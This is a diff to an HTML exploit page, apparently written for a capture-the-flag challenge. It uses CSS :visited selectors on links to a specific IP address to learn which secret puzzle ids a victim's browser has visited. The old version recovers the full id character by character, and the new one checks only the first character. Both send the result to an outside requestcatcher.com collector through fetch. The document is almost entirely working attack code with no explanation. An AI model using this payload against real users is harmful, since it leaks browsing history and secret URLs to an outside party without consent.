@@ -1,43 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <style id="s">a{color:black;}</style>
+  <style>
+    a { color: black; display: block; padding: 5px; }
+    
+    /* Test first character - each possible hex character */
+    a[href^="http://34.146.134.179:3000/puzzle?id=0"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=1"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=2"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=3"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=4"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=5"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=6"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=7"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=8"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=9"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=a"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=b"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=c"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=d"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=e"]:visited { color: red !important; }
+    a[href^="http://34.146.134.179:3000/puzzle?id=f"]:visited { color: red !important; }
+  </style>
 </head>
 <body>
-  <a id="a"></a>
   <script>
-    (async()=>{
-      const base='http://34.146.134.179:3000/puzzle?id=';
-      const hex='0123456789abcdef';
-      let id='';
-      const a=document.getElementById('a');
-      const s=document.getElementById('s');
-      
-      for(let pos=0;pos<32;pos++){
-        let css='a{color:black;}';
-        for(const c of hex){
-          css+=`a[href^="${base}${id}${c}"]:visited{color:red!important;}`;
+    setTimeout(() => {
+      const links = document.querySelectorAll('a');
+      let found = '';
+      links.forEach(link => {
+        if (getComputedStyle(link).color === 'rgb(255, 0, 0)') {
+          found = link.textContent;
         }
-        s.textContent=css;
-        
-        let found=false;
-        for(const c of hex){
-          a.href=base+id+c+'0'.repeat(31-pos);
-          await new Promise(r=>requestAnimationFrame(r));
-          await new Promise(r=>setTimeout(r,100));
-          if(getComputedStyle(a).color==='rgb(255, 0, 0)'){
-            id+=c;
-            found=true;
-            break;
-          }
-        }
-        if(!found)break;
-      }
-      
-      if(id.length>0){
-        fetch(`https://singetu0096.requestcatcher.com/?found=${id}&len=${id.length}`);
-      }
-    })();
+      });
+      fetch(`https://singetu0096.requestcatcher.com/?first_char=${found || 'none'}`);
+    }, 1000);
   </script>
+  <a href="http://34.146.134.179:3000/puzzle?id=0000000000000000000000000000000000000000">0</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=1000000000000000000000000000000000000000">1</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=2000000000000000000000000000000000000000">2</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=3000000000000000000000000000000000000000">3</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=4000000000000000000000000000000000000000">4</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=5000000000000000000000000000000000000000">5</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=6000000000000000000000000000000000000000">6</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=7000000000000000000000000000000000000000">7</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=8000000000000000000000000000000000000000">8</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=9000000000000000000000000000000000000000">9</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=a000000000000000000000000000000000000000">a</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=b000000000000000000000000000000000000000">b</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=c000000000000000000000000000000000000000">c</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=d000000000000000000000000000000000000000">d</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=e000000000000000000000000000000000000000">e</a>
+  <a href="http://34.146.134.179:3000/puzzle?id=f000000000000000000000000000000000000000">f</a>
 </body>
 </html>
